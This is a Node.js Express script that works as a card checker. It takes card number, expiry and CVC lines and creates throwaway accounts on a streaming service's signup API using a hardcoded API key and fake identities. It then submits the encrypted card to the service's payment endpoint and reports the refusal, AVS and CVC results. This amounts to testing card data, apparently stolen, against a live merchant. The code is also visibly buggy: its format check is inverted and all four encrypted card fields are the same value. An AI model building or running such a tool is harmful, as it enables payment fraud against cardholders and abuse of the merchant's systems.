const { Router } = require('express');
const express = require('express')
const app = express();
const adyenEncrypt = require('node-adyen-encrypt')(25)
const fetch = require('node-fetch')
const query = require('readline-sync');

app.listen(3000, () => {
  console.log("ESTOY FUNCIONANDO")
})



    app.get('/:lista', (req, res) => {
     var lista = req.params.lista
    var list = lista;
    var regex= new RegExp("^\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$")
    if (regex.test(list)){
        console.log('Invalid Format')
        process.exit()
    }else{
       console.log('Consulting.....')
    }
    var list = list.split("|")
    var cc= list[0]
    var mm = list[1]
    var yy = list[2]
    var cvc = list[3]

    var key = "10001|C9552E35949AFB903F2DFC88A87728D6FAABE805D63D354063D39E6A1C21A7A47BBF8806AB544EEDDA8A1B167667892BEE3C7F198A87522A888003EB5D74A2AE7B118EA1209A269234F30B5BC3E6F4E125D92405C3CFD7FB6D4A8AC86435B0B3D7E8FB58FF4234FDB163B3B85609CFB6A1985C2F25859F5564F29894F415375A40B90F6FB78B2E9F003EC506EA7DC3FA6FFD3657B018F53C20C1E53E7EE16F75B402EA3439CB2D894F109112D5DB845877E7730518CB761AAC7E201DE60CC2AE12686D0EC43B3D39E0D1A2413ED6369B5D83F6CBAF1118DA9AAA1EF86DE53DA05724614FC40679C10AD99F62EB0C0D9E589FFF2B72AB9A2B4807F97C99A108AB"     
    var options = {};
    var generationtime = new Date().toISOString()
    const cardData = {
        number : cc, 
        cvc : cvc,   
        holderName : "John Doe", 
        expiryMonth : mm, 
        expiryYear : yy,  
        generationtime : generationtime 
    };
    var cseInstance = adyenEncrypt.createEncryption(key, options);
    var ecc = cseInstance.encrypt(cardData);
    var emm = cseInstance.encrypt(cardData);
    var eyy = cseInstance.encrypt(cardData);
    var ecvc = cseInstance.encrypt(cardData);

  console.log(req.params)
  fetch("https://random-data-api.com/api/users/random_user"
  ).then( response => response.json())
  .then(data => {

    var lo = data.email
    lo.replace(/[^a-zA-Z 0-9.]+/g,'_');
    console.log(lo)
    fetch("https://wuxfdb4hkd.execute-api.us-west-2.amazonaws.com/throttled/pureflix-RegisterIDM-prod",{
      "headers": {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json;charset=UTF-8",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"",
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "x-api-key": "JSOPMsTlAS73D2SmBtcFsrtFVwbhwxX4iEkBNC22"
      },
      "referer": "https://signup.pureflix.com/signup/2/n/account",
      "body": `{"user":{"provided_first_name":"herson","provided_last_name":"vanegas","email":"`+lo+`","email_confirmation":"`+lo+`","password":"1234567890","password_confirmation":"1234567890","mkt_email_subscriber":true},"funnelId":"V2","hutk":"62337b6814e48089bb327bc9fd9e2449"}`,
      "method": "POST",
      "mode": "cors"
    }).then(response => response.json())
    .then(data => {
      var tk = data.userId
      console.log(tk)
      fetch("https://wuxfdb4hkd.execute-api.us-west-2.amazonaws.com/throttled/pureflix-AdyenPayments-prod", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
    "content-type": "application/json;charset=UTF-8",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"",
    "sec-ch-ua-mobile": "?0",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "x-api-key": "JSOPMsTlAS73D2SmBtcFsrtFVwbhwxX4iEkBNC22"
  },
  "referrer": "https://signup.pureflix.com/signup/2/n/payment",
  "referrerPolicy": "no-referrer-when-downgrade",
  "body": `{"paymentMethod":{"type":"scheme","encryptedCardNumber":"${ecc}","encryptedExpiryMonth":"${emm}","encryptedExpiryYear":"${eyy}","encryptedSecurityCode":"${ecvc}","holderName":"ldancladciodaj adnclkaNEDla","billingAddress":{"city":"NA","country":"US","houseNumberOrName":"NA","postalCode":"10080","stateOrProvince":"NA","street":"NA"}},"returnUrl":"https://signup.pureflix.com/signup/2/n/payment","mpxUserId":"`+tk+`","shopperEmail":"`+lo+`"}`,
  "method": "POST",
  "mode": "cors"
})
.then(response => response.json())
.then(data => {

  var razon = data.additionalData.refusalReasonRaw
  var avs = data.additionalData.avsResultRaw
  var cvc = data.additionalData.cvcResultRaw

  var json = {
    RESPONSE: razon,
    AVS: avs,
    CVC: cvc
  }
    res.send(json)
 })
.catch((error) => {
  console.error('Error:', error);
});

  })
    .catch((error) => {
      console.error('Error:', error);
    })

})
  .catch((error) => {
    console.error('Error:', error);
  }) 
 
})

    



            


